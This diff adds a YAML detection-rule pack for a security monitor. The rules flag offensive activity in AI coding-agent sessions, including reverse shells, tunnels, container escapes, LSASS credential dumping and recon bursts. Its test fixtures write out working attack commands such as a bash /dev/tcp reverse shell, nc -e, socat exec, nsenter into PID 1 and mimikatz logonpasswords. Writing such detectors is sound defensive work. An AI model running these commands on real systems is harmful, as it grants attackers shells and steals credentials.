@@ -1,0 +1,347 @@
+# Offensive tooling and remote access from agent sessions. Security teams
+# and CTF players run these on purpose: hosts tagged "offsec" (Fleet label
+# or configuration, Options.HostTags) are exempt from the findings here.
+pack: offensive
+version: "2026.11.0"
+description: Offensive security tools, reverse shells, tunnels, container escapes and credential dumping.
+rules:
+  - id: SPR-OFFSEC-001
+    title: Offensive security tool run from an agent session
+    description: >-
+      The agent runs a scanner, relay, brute-forcer or exploitation
+      framework (nmap, NetExec, impacket, certipy, responder, sqlmap,
+      hydra ...). Operators have driven coding agents through whole
+      intrusions this way (GTG-1002, CyberXero).
+    kind: activity
+    class: finding
+    severity: medium
+    confidence: medium
+    maturity: stable
+    category: discovery
+    tags: [atlas.aml.t0103, owasp.asi02]
+    references:
+      - "research/threats.md section 2 row 44: agent as intrusion console (GTG-2002, GTG-1002, Aurora, CyberXero)"
+      - "research/threats.md section 3 R44"
+    falsepositives:
+      - "Security engineers and CTF work (tag those hosts offsec)"
+    when:
+      type: [tool.pre, process.exec]
+    match:
+      any_command:
+        name|in_list: offensive_tools
+    allow:
+      host.tags: offsec
+    dedup: [shell.commands]
+    evidence: [target.command, shell.commands]
+    remedy: Confirm the session is authorised security work; tag the host offsec if it is.
+    tests:
+      - name: netexec sweep
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "nxc smb 10.0.0.0/24 -u u -p p" } }
+        expect: match
+      - name: impacket secretsdump
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "impacket-secretsdump dom/u:p@10.0.0.5" } }
+        expect: match
+      - name: ordinary network checks
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "curl -I https://example.com && dig example.com" } }
+        expect: no_match
+      - name: grep for the word nmap
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "grep -rn nmap docs/" } }
+        expect: no_match
+
+  - id: SPR-OFFSEC-002
+    title: Reverse shell
+    description: >-
+      An interactive shell is connected to a remote socket (bash -i with
+      /dev/tcp, nc -e, socat exec:). Nobody needs this for coding work.
+    kind: activity
+    class: alert
+    severity: critical
+    confidence: high
+    maturity: stable
+    category: command_and_control
+    tags: [attack.t1059.004, atlas.aml.t0050, owasp.asi05]
+    references:
+      - "research/threats.md section 3 R45"
+    falsepositives:
+      - "Authorised penetration tests (tag those hosts offsec)"
+    when:
+      type: [tool.pre, process.exec]
+    match:
+      any:
+        - all:
+            - shell.exfil: netcat_out
+            - any_command:
+                name|in: [bash, sh, zsh, dash, ksh]
+                args|contains_any: ["-i"]
+        - any_command:
+            name|in: [nc, ncat, netcat]
+            args|any_re: "^-[a-zA-Z]*[ec]$"
+        - any_command:
+            name: socat
+            args|any_re: "(?i)(^|,|:)(exec|system):"
+    allow:
+      host.tags: offsec
+    evidence: [target.command, shell.hosts]
+    remedy: Kill the process and treat the host as compromised until the session is understood.
+    tests:
+      - name: bash to /dev/tcp
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1" } }
+        expect: match
+      - name: nc -e
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "nc -e /bin/sh 203.0.113.5 4444" } }
+        expect: match
+      - name: socat exec
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "socat tcp-connect:203.0.113.5:4444 exec:/bin/sh" } }
+        expect: match
+      - name: nc port check
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "nc -zv localhost 5432" } }
+        expect: no_match
+      - name: interactive local shell
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "bash -i -c 'echo $PS1'" } }
+        expect: no_match
+
+  - id: SPR-OFFSEC-003
+    title: Local service exposed through a tunnel
+    description: >-
+      ngrok, cloudflared, bore, localtunnel, Tailscale Funnel or ssh -R
+      publishes a local port to the internet. Webhook testing does this, so
+      it is a signal.
+    kind: activity
+    class: signal
+    severity: low
+    confidence: high
+    maturity: stable
+    category: command_and_control
+    tags: [attack.t1572, attack.t1090]
+    references:
+      - "research/threats.md section 3 R45; section 6 (ngrok for webhook testing)"
+    when:
+      type: [tool.pre, process.exec]
+    match:
+      shell.net_tools|contains_any: [ngrok, cloudflared, bore, localtunnel, tailscale_funnel, ssh_reverse_tunnel]
+    dedup: [shell.net_tools]
+    evidence: [target.command, shell.net_tools]
+    remedy: No action on its own.
+    tests:
+      - name: ngrok
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "ngrok http 3000" } }
+        expect: match
+      - name: ssh -R
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "ssh -R 8080:localhost:80 user@host" } }
+        expect: match
+      - name: ssh login
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "ssh deploy@build.example uptime" } }
+        expect: no_match
+
+  - id: SPR-OFFSEC-004
+    title: Pivoting relay or anonymiser started
+    description: >-
+      chisel, frp or tor is started. These are pivoting and anonymising
+      tools rather than development tunnels.
+    kind: activity
+    class: finding
+    severity: medium
+    confidence: high
+    maturity: stable
+    category: command_and_control
+    tags: [attack.t1572, attack.t1090]
+    references:
+      - "research/threats.md section 3 R44, R45"
+    falsepositives:
+      - "Network engineers testing relays (tag those hosts offsec)"
+    when:
+      type: [tool.pre, process.exec]
+    match:
+      shell.net_tools|contains_any: [chisel, frp, tor]
+    allow:
+      host.tags: offsec
+    dedup: [shell.net_tools]
+    evidence: [target.command, shell.net_tools]
+    remedy: Stop the relay and find out what it was exposing.
+    tests:
+      - name: chisel client
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "chisel client 203.0.113.5:8000 R:socks" } }
+        expect: match
+      - name: ngrok is the signal rule
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "ngrok http 3000" } }
+        expect: no_match
+      - name: ordinary curl
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "curl -s https://example.com" } }
+        expect: no_match
+
+  - id: SPR-OFFSEC-005
+    title: Container started with host-level privileges
+    description: >-
+      docker run --privileged, the Docker socket mounted into a container,
+      or added capabilities. Common in local tooling (testcontainers, kind,
+      docker-in-docker), so a signal; SPR-OFFSEC-006 is the finding.
+    kind: activity
+    class: signal
+    severity: low
+    confidence: high
+    maturity: stable
+    category: privilege_escalation
+    tags: [attack.t1611, attack.t1609]
+    references:
+      - "research/threats.md section 2 row 22: sandbox escapes (Docker socket)"
+      - "research/threats.md section 3 R43"
+    when:
+      type: [tool.pre, process.exec]
+    match:
+      shell.privilege|contains_any: [docker_privileged, docker_socket_mount, cap_add]
+    dedup: [shell.privilege]
+    evidence: [target.command, shell.privilege]
+    remedy: No action on its own.
+    tests:
+      - name: privileged container
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "docker run --privileged --network host -v /tmp/x:/x alpine true" } }
+        expect: match
+      - name: docker socket mount
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine" } }
+        expect: match
+      - name: network host only
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "docker run --rm --network host fluent/fluent-bit:latest" } }
+        expect: no_match
+
+  - id: SPR-OFFSEC-006
+    title: Host root or host PID namespace entered from a container command
+    description: >-
+      A command enters PID 1's namespaces (nsenter -t 1) or mounts the
+      host root into a container and changes into it (-v /:/host, chroot
+      /host). That is a container escape primitive, not a development
+      convenience.
+    kind: activity
+    class: finding
+    severity: high
+    confidence: high
+    maturity: stable
+    category: privilege_escalation
+    tags: [attack.t1611, owasp.asi03]
+    references:
+      - "research/threats.md section 2 row 22: sandbox escapes"
+      - "research/threats.md section 3 R43"
+    falsepositives:
+      - "Node debugging by platform engineers"
+    when:
+      type: [tool.pre, process.exec]
+    match:
+      any:
+        - any_command:
+            name: nsenter
+            all:
+              - args|contains_any: ["-t", "--target", "-t1", "--target=1"]
+              - args|contains_any: ["1", "-t1", "--target=1"]
+        - any_command:
+            name|in: [docker, podman, nerdctl]
+            args|any_re: "^/:/"
+        - any_command:
+            name: chroot
+            args|any_re: "^/host"
+    allow:
+      host.tags: offsec
+    evidence: [target.command]
+    remedy: Check whether the agent was supposed to administer the node; stop it otherwise.
+    tests:
+      - name: nsenter into PID 1
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "docker run --pid=host --privileged -it alpine nsenter -t 1 -m -u -n -i sh" } }
+        expect: match
+      - name: host root mounted
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "docker run -v /:/host alpine chroot /host" } }
+        expect: match
+      - name: project mounted
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "docker run -v $PWD:/src -w /src golang:1.26 go test ./..." } }
+        expect: no_match
+      - name: nsenter into a container pid
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "nsenter -t 4242 -n ip addr" } }
+        expect: no_match
+
+  - id: SPR-OFFSEC-007
+    title: Credential dumping tool or LSASS dump
+    description: >-
+      mimikatz, pypykatz, lsassy, an LSASS memory dump through procdump or
+      comsvcs.dll MiniDump. Operating-system credential theft has no place
+      in an agent session.
+    kind: activity
+    class: alert
+    severity: critical
+    confidence: high
+    maturity: stable
+    category: credential_access
+    tags: [atlas.aml.t0055, owasp.asi03]
+    references:
+      - "research/threats.md section 2 row 44: agent as intrusion console"
+      - "research/threats.md section 3 R44"
+    falsepositives:
+      - "Authorised red-team exercises (tag those hosts offsec)"
+    when:
+      type: [tool.pre, process.exec]
+    match:
+      any:
+        - any_command:
+            name|in: [mimikatz, mimikatz.exe, pypykatz, lsassy, nanodump, nanodump.exe]
+        - any_command:
+            name|in: [procdump, procdump.exe, procdump64.exe]
+            args|any_re: "(?i)lsass"
+        - any_command:
+            name|in: [rundll32, rundll32.exe]
+            args|any_re: "(?i)comsvcs(\\.dll)?,?$"
+    allow:
+      host.tags: offsec
+    evidence: [target.command]
+    remedy: Treat every credential on the host as stolen.
+    tests:
+      - name: mimikatz
+        event: { type: tool.pre, tool: { kind: shell, name: PowerShell }, target: { command: "mimikatz.exe \"sekurlsa::logonpasswords\" exit" } }
+        expect: match
+      - name: procdump lsass
+        event: { type: tool.pre, tool: { kind: shell, name: PowerShell }, target: { command: "procdump -ma lsass.exe lsass.dmp" } }
+        expect: match
+      - name: procdump of an app
+        event: { type: tool.pre, tool: { kind: shell, name: PowerShell }, target: { command: "procdump -ma myservice.exe svc.dmp" } }
+        expect: no_match
+      - name: listing processes
+        event: { type: tool.pre, tool: { kind: shell, name: PowerShell }, target: { command: "Get-Process lsass" } }
+        expect: no_match
+
+  - id: SPR-OFFSEC-008
+    title: Burst of reconnaissance commands
+    description: >-
+      Five commands that enumerate identity, host and network (whoami, id,
+      uname, ifconfig, netstat, ps, env, cloud identity, secret searches)
+      within five minutes. Debugging does some of this; an intruder's first
+      minutes do all of it.
+    kind: activity
+    class: signal
+    severity: low
+    confidence: low
+    maturity: experimental
+    category: discovery
+    tags: [attack.t1082, attack.t1057]
+    references:
+      - "research/threats.md section 2 row 44"
+    when:
+      type: [tool.pre, process.exec]
+    match:
+      shell.recon|exists: true
+    threshold:
+      count: 5
+      window: 5m
+    evidence: [target.command, shell.recon]
+    remedy: No action on its own.
+    tests:
+      - name: five recon commands
+        events:
+          - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "whoami" } }
+          - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "id" } }
+          - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "uname -a" } }
+          - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "ip a" } }
+          - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "netstat -tlnp" } }
+        expect: match
+      - name: one recon command
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "uname -a" } }
+        expect: no_match
+      - name: build commands
+        events:
+          - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "go build ./..." } }
+          - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "go vet ./..." } }
+        expect: no_match
